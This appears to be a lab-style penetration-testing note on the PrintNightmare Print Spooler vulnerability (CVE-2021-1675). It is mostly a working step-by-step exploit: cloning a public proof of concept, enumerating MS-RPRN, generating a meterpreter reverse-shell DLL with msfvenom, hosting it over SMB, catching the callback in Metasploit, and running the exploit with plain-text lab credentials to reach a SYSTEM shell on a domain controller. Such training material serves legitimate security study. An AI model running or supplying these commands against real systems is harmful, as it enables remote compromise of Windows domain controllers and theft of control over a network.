`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.

 Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

---
## TL;DR

- Vulnerable **Print Spooler** (DCs included) → remote code execution as **NT AUTHORITY\SYSTEM**.
    
- Attack path here uses **cube0x0’s** PoC + his **Impacket** fork to push/load a DLL from an SMB share via **MS-RPRN**.
    
- Flow: confirm RPRN/PAR → prep DLL payload → host over SMB → start listener → trigger CVE-2021-1675 PoC → catch SYSTEM.
    

---

## Preconditions

- Domain creds with network reachability to target (DC in example).
    
- Target exposes **MS-RPRN** (Print System Remote Protocol) and **MS-PAR**.
    
- On attacker: Python3, git, Metasploit (for handler), ability to run Impacket & PoC.
    
- Note: Modern systems may be patched; PoC may fail if mitigations are present.
    

---

## Tooling Setup (Attack Host)

```bash
# PoC
git clone https://github.com/cube0x0/CVE-2021-1675.git

# Use cube0x0’s Impacket fork (required by this PoC)
pip3 uninstall -y impacket
git clone https://github.com/cube0x0/impacket
cd impacket && python3 ./setup.py install
```

---

## Enumerating for MS-RPRN
```bash
z3tssu@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

```bash
rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
```

---

## Generating a DLL Payload

After confirming the above, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<ATTACK_IP> LPORT=8080 -f dll > backupscript.dll
```

---

## Host the Payload (SMB)

Serve the DLL from a share the target can reach.

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
# UNC path you’ll pass to the exploit:
# \\<ATTACK_IP>\CompData\backupscript.dll
```

---

## Listener (Metasploit)
Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACK_IP>
set LPORT 8080
run
```

---

## Exploit (cube0x0 PoC)

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell

```bash
cd CVE-2021-1675

sudo python3 CVE-2021-1675.py \
  inlanefreight.local/forend:Klmcargo2@172.16.5.5 \
  '\\172.16.5.225\CompData\backupscript.dll'
```

- If successful, the target DC loads your DLL from the SMB share and calls back to the handler.
    
- Verify SYSTEM:
    

```text
(Meterpreter) > shell
C:\Windows\system32> whoami
nt authority\system
```

## Quick Checklist

- [ ]  Confirm MS-RPRN/MS-PAR exposed: `rpcdump.py`.
    
- [ ]  Build DLL payload: `msfvenom`.
    
- [ ]  Host DLL via SMB: `smbserver.py`.
    
- [ ]  Start handler: Metasploit multi/handler.
    
- [ ]  Run PoC with proper creds/UNC path.
    
- [ ]  Verify SYSTEM, do post-ex per scope.
    
- [ ]  Clean up artifacts and document.